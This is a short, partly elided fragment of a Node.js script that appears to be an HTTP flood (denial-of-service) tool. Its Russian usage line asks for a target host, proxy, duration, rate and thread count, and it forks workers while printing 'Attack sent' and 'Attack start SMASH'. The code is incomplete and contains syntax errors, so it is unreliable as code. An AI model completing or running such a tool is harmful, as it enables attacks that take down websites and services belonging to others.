...
if (process.argv.length < 8){
    console.log('ебем');
    console.log('node ' + file + ' (мод) (хост) (прокси) (время) (300) (потоки 100) (options cookie="" postdata="" randomstring="" headerdata="")');
...
if (headerbuilders !== undefined){
    ...
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
            console.log(`(!) Attack sent ${i});
        }
        console.log("(!)Attack start SMASH...)
